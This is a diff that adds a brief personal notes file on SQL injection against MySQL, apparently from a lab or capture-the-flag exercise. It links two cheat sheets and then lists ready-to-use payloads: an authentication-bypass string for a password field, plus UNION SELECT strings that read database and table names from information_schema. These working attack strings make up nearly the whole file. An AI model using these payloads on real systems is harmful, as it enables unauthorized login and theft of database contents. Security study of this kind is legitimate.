@@ -1,0 +1,15 @@
+SQL INJECTION:
+
+mysql used here.
+
+https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/
+https://admiralgaust.github.io/SQL-Injection-cheat-sheet/
+
+
+sql injection first form:  admin') or '1'='1'#		(in password field.)
+
+sql injection in country field:
+1) ' union select 1,2,3#			(display all the table)
+
+2) param=' or 1=0 union select table_schema,null,null from information_schema.columns#			(display all database name)
+   param=' or 1=0 union select table_name,null,null from information_schema.columns#			(display all table name)
